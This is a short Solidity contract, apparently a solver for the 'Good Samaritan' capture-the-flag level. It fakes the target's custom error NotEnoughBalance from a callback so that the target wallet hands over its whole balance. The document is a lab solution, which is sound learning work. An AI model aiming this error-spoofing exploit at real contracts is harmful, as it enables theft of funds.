pragma solidity ^0.8.0;

contract SamaritanSolver {
    error NotEnoughBalance();
    function notify(uint256 amount) external {
        //need this because when this contract gets the remaining transfered, this function
        //will be called again and we don't want it to be reverted by then.
        if (amount == 10) {
        revert NotEnoughBalance();
        }
    }

    function exp() external {
        //i spent like an hour and a half because of it running out of gas.
        //noticed it after debugging it in tenderly..
        address(0x18c6e36bdB49596d05d75772614a1190578d96f9).call{value: 0, gas: 100000000}(abi.encodeWithSignature("requestDonation()"));
    }
}